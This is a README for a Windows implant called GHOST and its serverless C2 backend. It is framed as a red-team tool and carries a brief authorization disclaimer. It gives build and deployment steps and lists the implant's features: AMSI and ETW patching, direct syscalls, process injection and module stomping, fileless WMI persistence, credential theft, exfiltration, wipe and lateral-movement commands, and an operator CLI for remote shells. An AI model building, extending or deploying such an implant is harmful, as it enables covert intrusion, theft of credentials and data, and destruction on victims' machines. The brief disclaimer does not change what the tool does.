# GHOST — Windows Implant & C2 Infrastructure

**GHOST** is a stealthy Windows x64 implant with a serverless Cloudflare Worker C2 backend.  
Built for authorized red team operations. Cross-compiled from **Kali Linux** using MinGW-w64.

---

## Build on Kali (One Command)

```bash
# 1. Install toolchain (once)
./build.sh --setup

# 2. Build ghost.exe
./build.sh

# Output: build/ghost.exe
```

That's it. No Visual Studio, no Windows SDK, no WSL.

---

## Project Structure

```
ghostimplant/
├── src/
│   ├── main.cpp          # Entry point — sandbox check, init, beacon loop
│   ├── c2.cpp            # WinHTTP beacon, AES-256-GCM transport, command dispatch
│   ├── syscalls.cpp      # Direct NT syscall table — parses ntdll, builds stubs
│   ├── evasion.cpp       # AMSI/ETW patch, HW breakpoint clear, sandbox detection
│   ├── injection.cpp     # Remote injection, PPID spoof, APC queue, module stomp
│   ├── persistence.cpp   # WMI CommandLine/Script consumer, registry Run, schtasks
│   ├── utils.cpp         # AES-256-GCM (BCrypt), Base64, hardware key derivation
│   └── launcher.cpp      # Tray launcher — spawns ghost.exe on demand
├── include/
│   ├── obfuscate.hpp     # Compile-time XOR strings (XS/XSW), FNV-1a hash, HashProc
│   ├── config.hpp        # C2 domain (XOR-encrypted), beacon timing, PSK
│   ├── syscalls.hpp      # SyscallTable struct, InitializeSyscalls()
│   ├── evasion.hpp       # PatchAMSI, PatchETW, ClearHardwareBreakpoints
│   ├── injection.hpp     # SpawnWithPPID, InjectRemoteProcess, StompModule
│   ├── persistence.hpp   # WMI/registry/schtasks install and remove
│   ├── c2.hpp            # BeaconLoop()
│   └── utils.hpp         # Crypto, encoding, system info, JitterSleep
├── worker/               # Cloudflare Worker C2 backend (TypeScript)
│   └── src/index.ts      # API routing, KV task queue, session management
├── server/
│   ├── c2_cli.py         # Operator CLI — sessions, shell, task dispatch
│   └── requirements.txt
├── tools/
│   └── encrypt_domain.py # XOR-encrypt C2 domain for config.hpp
├── resources/
│   ├── ghost.rc          # PE version info and manifest
│   └── ghost.manifest    # UAC/DPI manifest
├── build.sh              # Kali/Linux cross-compile script (MinGW-w64)
└── build.ps1             # Windows MSVC build script (optional)
```

---

## Configuration Before Building

### 1. Encrypt your C2 domain

```bash
python3 tools/encrypt_domain.py ghost-c2.yourdomain.workers.dev HOSTNAME
```

Paste the output byte array into `include/config.hpp` under `C2_DOMAIN_ENCRYPTED[]`.

### 2. Set the XOR key

In `include/obfuscate.hpp`, change `GHOST_XOR_KEY` before each build:

```cpp
#define GHOST_XOR_KEY 0x5Au   // change this — one byte, arbitrary
```

### 3. Set beacon timing (optional)

In `include/config.hpp`:

```cpp
constexpr uint32_t BEACON_MIN = 5;   // seconds
constexpr uint32_t BEACON_MAX = 10;
```

---

## Build Options

```bash
./build.sh            # release — optimized, stripped
./build.sh --debug    # debug symbols, no strip, -DDEBUG
./build.sh --setup    # apt install mingw-w64 (Debian/Ubuntu/Kali)
```

Output is always `build/ghost.exe` and `build/launcher.exe`.

---

## Module Summary

| Module | What it does |
|---|---|
| `syscalls.cpp` | Parses ntdll.dll PE export table at runtime, extracts syscall numbers, builds RWX stubs. No `GetProcAddress` or IAT entries for NT functions. |
| `evasion.cpp` | Patches `AmsiScanBuffer`, `AmsiScanString`, `EtwEventWrite` family with `xor eax,eax; ret` / `ret`. Uses `NtProtectVirtualMemory` to flip permissions. Clears DR0-DR3 on all threads via VEH. CPUID + uptime sandbox check. |
| `injection.cpp` | Full syscall-chain injection: `NtOpenProcess → NtAllocateVirtualMemory → NtWriteVirtualMemory → NtProtectVirtualMemory → NtCreateThreadEx`. PPID spoofing via `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`. APC queue injection. Module stomping of signed DLLs. |
| `persistence.cpp` | WMI `CommandLineEventConsumer` and `ActiveScriptEventConsumer` (VBScript in WMI repository — no file on disk). HKCU/HKLM Run key. Scheduled task via `schtasks.exe`. |
| `c2.cpp` | WinHTTP HTTPS beacon. AES-256-GCM double-encrypted payload. Hardware-derived session key (volume serial + CPUID + hostname → SHA-256). DNS TXT fallback. Command dispatch: `!ps`, `!inject`, `!migrate`, `!exfil`, `!wipe`, `!lateral`, `!creds`, `download`, `upload`, `sleep`. |
| `obfuscate.hpp` | Compile-time XOR of all string literals via `constexpr XorStr<N>`. FNV-1a hash at compile time. `HashProc()` walks PE export table by hash — zero function name strings in binary. |

---

## C2 Backend (Cloudflare Worker)

```bash
cd worker
npm install
npx wrangler deploy
```

Set secrets via Wrangler:
```bash
wrangler secret put BEACON_TOKEN
wrangler secret put OPERATOR_TOKEN
```

## Operator CLI

```bash
cd server
pip install -r requirements.txt

export GHOST_C2_URL="https://ghost-c2.yourdomain.workers.dev"
export GHOST_OPERATOR_TOKEN="your-operator-token"

python3 c2_cli.py sessions
python3 c2_cli.py shell <session-id>
```

---

## Disclaimer

For **authorized security research and red team engagements only**.  
Do not use against systems you do not own or have explicit written authorization to test.
